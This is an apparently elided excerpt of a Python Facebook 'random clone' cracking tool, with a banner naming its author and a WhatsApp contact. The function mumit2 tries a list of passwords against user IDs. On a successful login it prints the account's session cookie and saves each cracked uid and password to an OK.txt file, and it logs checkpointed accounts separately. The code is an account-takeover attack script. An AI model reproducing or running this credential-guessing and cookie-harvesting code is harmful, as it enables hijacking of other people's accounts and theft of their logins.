...
[] TOOLS     : RANDOM CLONE
[] TYPE      : FREE
[] FACEBOOK  : Nayeem Nawaz
[] WHATSAPP  : +8801827673253
==================================================""")
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[NAYEEM]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[INAYEEM-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/INAYEEM/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94mINAYEEM[-CP] {cid}|{ps}")
